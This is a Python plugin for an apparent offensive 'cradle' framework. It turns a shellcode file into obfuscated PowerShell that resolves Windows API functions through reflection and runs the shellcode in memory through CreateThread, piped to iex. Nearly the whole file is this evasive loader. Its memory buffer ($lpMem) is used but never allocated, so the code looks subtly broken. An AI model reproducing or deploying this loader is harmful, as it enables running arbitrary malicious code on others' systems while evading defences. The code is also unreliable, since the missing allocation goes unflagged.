import secrets
import string

from plugins._base import BaseCradlePlugin
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class ProcShellcodeSgr(BaseCradlePlugin):
    NAME        = "proc_shellcode_sgr"
    DESCRIPTION = "Process Shellcode Runner - Starts thread in the context of the current process using SGR (Seeded Get-Random) obfuscated PowerShell"
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        "PAYLOAD_FILE": {
            "description": "Local path to binary file containing payload.",
            "required": True
        },
        **BaseCradlePlugin.OPTIONS
    }

    def generate(self, inst: CradleInstance) -> str:
        payload_file    = inst.options.get("PAYLOAD_FILE", "").lower()

        try:
            with open(payload_file, "rb") as pf:
                bindat = pf.read()
        except:
            print(f"Unable to load file '{payload_file}' for ProcInjectSgr plugin: {inst.index} ({inst.uid})")
            return;

        payload = []
        payload.append(
            f"({sgr(f"""
function LookupFunc {{
    Param($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}}).GetType('Microsoft.Win32.UnsafeNativeMethods');
    $tmp=@();
    $assem.GetMethods()|ForEach-Object{{if($_.Name -eq "GetProcAddress"){{$tmp+=$_}}}};
    return $tmp[0].Invoke($null,@(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)),$functionName))
}}

function getDelegateType {{
    Param (
        [Parameter(Position=0,Mandatory=$True)] [Type[]] $func,
        [Parameter(Position=1)] [Type] $delType=[Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule',$false).
        DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]);
    $type.
        DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed');
    $type.
        DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed');

    return $type.CreateType();
}}

[Byte[]] $buf = {",".join(f"0x{b:02x}" for b in bindat)}
[System.Runtime.InteropServices.Marshal]::Copy($buf, [int]0, [IntPtr]$lpMem, [int]$buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,[IntPtr]$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke([IntPtr]$hThread, 0xFFFFFFFF)
""")})|iex;"
        )

        return "\n".join(payload) + "\n"
        